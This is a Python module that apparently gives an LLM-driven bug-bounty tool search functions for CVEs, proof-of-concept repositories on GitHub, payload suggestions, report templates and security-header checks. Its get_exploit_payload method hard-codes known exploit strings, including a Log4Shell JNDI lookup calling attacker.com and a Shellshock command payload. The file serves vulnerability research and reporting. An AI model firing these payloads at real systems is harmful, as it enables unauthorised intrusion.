"""
Search Tools - Internet search for vulnerability research
Easy for LLM to search for CVEs, exploits, and vulnerability info
"""

import re
from typing import Dict, List, Optional, Any
from urllib.parse import quote_plus
import json

import sys
sys.path.append('..')
from core.http_client import HTTPClient


class SearchTools:
    """
    Internet search tools for vulnerability research
    
    Usage for LLM:
    - search.cve(cve_id) - Get CVE details
    - search.vulnerability(query) - Search for vulnerabilities
    - search.exploit(query) - Search for exploits
    - search.technology(name, version) - Get vulns for technology
    """
    
    def __init__(self, client: Optional[HTTPClient] = None):
        self.client = client or HTTPClient()
        
        # CVE databases
        self.cve_sources = {
            "nvd": "https://services.nvd.nist.gov/rest/json/cves/2.0",
            "cvedetails": "https://www.cvedetails.com/cve/",
            "mitre": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=",
        }
        
        # Exploit databases
        self.exploit_sources = {
            "exploit-db": "https://www.exploit-db.com/search",
            "packetstorm": "https://packetstormsecurity.com/search/",
            "github": "https://github.com/search?type=code&q=",
        }
        
        # Vulnerability databases by technology
        self.vuln_databases = {
            "wordpress": [
                "https://wpscan.com/wordpresses",
                "https://www.wordfence.com/threat-intel/vulnerabilities/",
            ],
            "apache": [
                "https://httpd.apache.org/security/vulnerabilities.html",
            ],
            "nginx": [
                "https://nginx.org/en/security_advisories.html",
            ],
        }

    def search_cve(self, cve_id: str) -> Dict[str, Any]:
        """
        Search for CVE details
        
        Args:
            cve_id: CVE identifier (e.g., CVE-2021-44228)
        
        Returns:
            CVE details
        """
        # Normalize CVE ID
        cve_id = cve_id.upper()
        if not cve_id.startswith("CVE-"):
            cve_id = f"CVE-{cve_id}"
        
        result = {
            "cve_id": cve_id,
            "found": False,
            "description": "",
            "severity": "",
            "cvss": None,
            "references": [],
            "affected_products": [],
            "exploits_available": False,
            "sources_checked": []
        }
        
        # Try NVD API (free, no key required for basic queries)
        try:
            nvd_url = f"{self.cve_sources['nvd']}?cveId={cve_id}"
            response = self.client.get(nvd_url)
            result["sources_checked"].append("nvd")
            
            if response.status_code == 200:
                try:
                    data = json.loads(response.body)
                    if data.get("vulnerabilities"):
                        vuln = data["vulnerabilities"][0]["cve"]
                        result["found"] = True
                        
                        # Get description
                        for desc in vuln.get("descriptions", []):
                            if desc.get("lang") == "en":
                                result["description"] = desc.get("value", "")
                                break
                        
                        # Get CVSS score
                        metrics = vuln.get("metrics", {})
                        if "cvssMetricV31" in metrics:
                            cvss = metrics["cvssMetricV31"][0]["cvssData"]
                            result["cvss"] = {
                                "version": "3.1",
                                "score": cvss.get("baseScore"),
                                "severity": cvss.get("baseSeverity"),
                                "vector": cvss.get("vectorString")
                            }
                            result["severity"] = cvss.get("baseSeverity", "")
                        
                        # Get references
                        for ref in vuln.get("references", [])[:10]:
                            result["references"].append(ref.get("url", ""))
                
                except json.JSONDecodeError:
                    pass
        except Exception as e:
            result["error"] = str(e)
        
        return result

    def search_vulnerability(self, query: str, 
                            technology: Optional[str] = None) -> Dict[str, Any]:
        """
        Search for vulnerabilities
        
        Args:
            query: Search query
            technology: Optional technology filter
        
        Returns:
            Search results
        """
        result = {
            "query": query,
            "technology": technology,
            "cves": [],
            "related_terms": [],
            "suggested_payloads": []
        }
        
        # Build search query
        search_query = query
        if technology:
            search_query = f"{technology} {query}"
        
        # Try to find related CVEs
        # This is a simplified search - in real implementation would use APIs
        vuln_patterns = {
            "xss": ["XSS", "cross-site scripting", "script injection"],
            "sqli": ["SQL injection", "SQLi", "database injection"],
            "ssrf": ["SSRF", "server-side request forgery"],
            "rce": ["RCE", "remote code execution", "command injection"],
            "lfi": ["LFI", "local file inclusion", "path traversal"],
            "xxe": ["XXE", "XML external entity"],
            "csrf": ["CSRF", "cross-site request forgery"],
        }
        
        # Identify vulnerability type from query
        for vuln_type, patterns in vuln_patterns.items():
            if any(p.lower() in query.lower() for p in patterns):
                result["vulnerability_type"] = vuln_type
                result["related_terms"] = patterns
                break
        
        # Get suggested payloads based on vulnerability type
        if result.get("vulnerability_type"):
            from payloads.templates import PayloadTemplates
            result["suggested_payloads"] = PayloadTemplates.get_by_category(
                result["vulnerability_type"]
            )[:5]
        
        return result

    def search_exploit(self, query: str, cve: Optional[str] = None) -> Dict[str, Any]:
        """
        Search for exploits
        
        Args:
            query: Search query or technology
            cve: Specific CVE to search for
        
        Returns:
            Exploit search results
        """
        result = {
            "query": query,
            "cve": cve,
            "exploits": [],
            "github_repos": [],
            "poc_available": False
        }
        
        search_term = cve or query
        
        # Check GitHub for POCs
        try:
            github_search = f"{search_term} exploit OR poc"
            github_url = f"https://api.github.com/search/repositories?q={quote_plus(github_search)}&sort=stars&per_page=5"
            
            response = self.client.get(github_url)
            if response.status_code == 200:
                try:
                    data = json.loads(response.body)
                    for repo in data.get("items", [])[:5]:
                        result["github_repos"].append({
                            "name": repo.get("full_name"),
                            "description": repo.get("description", "")[:200],
                            "stars": repo.get("stargazers_count"),
                            "url": repo.get("html_url")
                        })
                    if result["github_repos"]:
                        result["poc_available"] = True
                except:
                    pass
        except:
            pass
        
        return result

    def search_technology_vulns(self, technology: str, 
                                version: Optional[str] = None) -> Dict[str, Any]:
        """
        Search for vulnerabilities in a specific technology
        
        Args:
            technology: Technology name (e.g., apache, wordpress, nginx)
            version: Optional version number
        
        Returns:
            Known vulnerabilities
        """
        result = {
            "technology": technology,
            "version": version,
            "cves": [],
            "advisories": [],
            "recommendations": []
        }
        
        # Build search query
        query = technology
        if version:
            query = f"{technology} {version}"
        
        # Get CVEs from NVD
        try:
            nvd_url = f"{self.cve_sources['nvd']}?keywordSearch={quote_plus(query)}&resultsPerPage=10"
            response = self.client.get(nvd_url)
            
            if response.status_code == 200:
                try:
                    data = json.loads(response.body)
                    for vuln in data.get("vulnerabilities", [])[:10]:
                        cve = vuln["cve"]
                        cve_id = cve.get("id")
                        
                        # Get description
                        desc = ""
                        for d in cve.get("descriptions", []):
                            if d.get("lang") == "en":
                                desc = d.get("value", "")[:200]
                                break
                        
                        # Get severity
                        severity = "UNKNOWN"
                        metrics = cve.get("metrics", {})
                        if "cvssMetricV31" in metrics:
                            severity = metrics["cvssMetricV31"][0]["cvssData"].get("baseSeverity", "UNKNOWN")
                        
                        result["cves"].append({
                            "id": cve_id,
                            "description": desc,
                            "severity": severity
                        })
                except:
                    pass
        except:
            pass
        
        # Add recommendations
        common_recommendations = {
            "wordpress": [
                "Keep WordPress core updated",
                "Remove unused plugins",
                "Use security plugins like Wordfence",
                "Enable two-factor authentication"
            ],
            "apache": [
                "Keep Apache updated",
                "Disable unnecessary modules",
                "Configure proper access controls",
                "Enable security headers"
            ],
            "nginx": [
                "Keep Nginx updated",
                "Configure proper security headers",
                "Limit request rates",
                "Disable unnecessary features"
            ]
        }
        
        result["recommendations"] = common_recommendations.get(
            technology.lower(), 
            ["Keep software updated", "Follow security best practices"]
        )
        
        return result

    def get_exploit_payload(self, cve_id: str) -> Dict[str, Any]:
        """
        Get exploit payload for a CVE
        
        Args:
            cve_id: CVE identifier
        
        Returns:
            Exploit details and payload if available
        """
        result = {
            "cve_id": cve_id,
            "exploit_found": False,
            "payload": None,
            "type": None,
            "affected_component": None,
            "references": []
        }
        
        # Map of known CVEs to payloads (examples)
        known_exploits = {
            "CVE-2021-44228": {  # Log4Shell
                "type": "rce",
                "affected_component": "Apache Log4j",
                "payload": "${jndi:ldap://attacker.com/exploit}",
                "description": "Log4j JNDI lookup vulnerability"
            },
            "CVE-2017-5638": {  # Struts
                "type": "rce",
                "affected_component": "Apache Struts",
                "payload": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}",
                "description": "Apache Struts RCE"
            },
            "CVE-2014-6271": {  # Shellshock
                "type": "rce",
                "affected_component": "Bash",
                "payload": "() { :; }; /bin/bash -c 'id'",
                "description": "Bash Shellshock vulnerability"
            },
            "CVE-2019-11043": {  # PHP-FPM
                "type": "rce",
                "affected_component": "PHP-FPM",
                "payload": "Path manipulation in PATH_INFO",
                "description": "PHP-FPM RCE"
            }
        }
        
        cve_id = cve_id.upper()
        if cve_id in known_exploits:
            result["exploit_found"] = True
            result.update(known_exploits[cve_id])
        
        return result

    def search_hackerone_reports(self, query: str) -> Dict[str, Any]:
        """
        Search for HackerOne-style vulnerability reports
        
        This provides templates and examples for writing reports
        """
        result = {
            "query": query,
            "report_templates": [],
            "tips": []
        }
        
        # Report templates by vulnerability type
        templates = {
            "xss": {
                "title": "Reflected XSS in [Parameter]",
                "severity": "Medium to High",
                "template": """## Summary
Reflected Cross-Site Scripting (XSS) vulnerability in [URL] via the [parameter] parameter.

## Steps to Reproduce
1. Navigate to [URL]
2. Enter payload: [PAYLOAD]
3. Observe script execution

## Impact
An attacker can execute arbitrary JavaScript in victim's browser, potentially stealing sessions, credentials, or performing actions on behalf of the user.

## Proof of Concept
[Screenshot/Video]

## Remediation
- Encode output based on context
- Implement Content Security Policy
- Use HTTPOnly cookies"""
            },
            "sqli": {
                "title": "SQL Injection in [Endpoint]",
                "severity": "Critical",
                "template": """## Summary
SQL Injection vulnerability in [URL] allows unauthorized database access.

## Steps to Reproduce
1. Navigate to [URL]
2. Inject payload: [PAYLOAD]
3. Observe database error/data leakage

## Impact
- Full database access
- Data exfiltration
- Potential RCE via DB functions

## Proof of Concept
[Database version extraction]

## Remediation
- Use parameterized queries
- Implement input validation
- Principle of least privilege for DB users"""
            },
            "ssrf": {
                "title": "SSRF in [Feature]",
                "severity": "High to Critical",
                "template": """## Summary
Server-Side Request Forgery in [feature] allows access to internal resources.

## Steps to Reproduce
1. Use [feature] to fetch URL
2. Provide internal URL: [PAYLOAD]
3. Observe internal response

## Impact
- Access to internal services
- Cloud metadata exposure (AWS keys)
- Internal network scanning

## Proof of Concept
[AWS metadata screenshot]

## Remediation
- Whitelist allowed domains
- Block internal IP ranges
- Disable unnecessary protocols"""
            }
        }
        
        # Match query to template
        query_lower = query.lower()
        for vuln_type, template in templates.items():
            if vuln_type in query_lower:
                result["report_templates"].append(template)
        
        result["tips"] = [
            "Always include clear reproduction steps",
            "Demonstrate maximum impact",
            "Provide remediation recommendations",
            "Include screenshots/videos as proof",
            "Test in production-safe manner"
        ]
        
        return result

    def get_security_headers_info(self) -> Dict[str, Any]:
        """
        Get information about security headers to check
        """
        return {
            "headers_to_check": {
                "Content-Security-Policy": {
                    "purpose": "Prevents XSS and data injection",
                    "recommended": "default-src 'self'; script-src 'self'"
                },
                "X-Frame-Options": {
                    "purpose": "Prevents clickjacking",
                    "recommended": "DENY or SAMEORIGIN"
                },
                "X-Content-Type-Options": {
                    "purpose": "Prevents MIME sniffing",
                    "recommended": "nosniff"
                },
                "Strict-Transport-Security": {
                    "purpose": "Forces HTTPS",
                    "recommended": "max-age=31536000; includeSubDomains"
                },
                "X-XSS-Protection": {
                    "purpose": "Browser XSS filter (deprecated)",
                    "recommended": "0 (or rely on CSP)"
                },
                "Referrer-Policy": {
                    "purpose": "Controls referrer information",
                    "recommended": "strict-origin-when-cross-origin"
                }
            }
        }
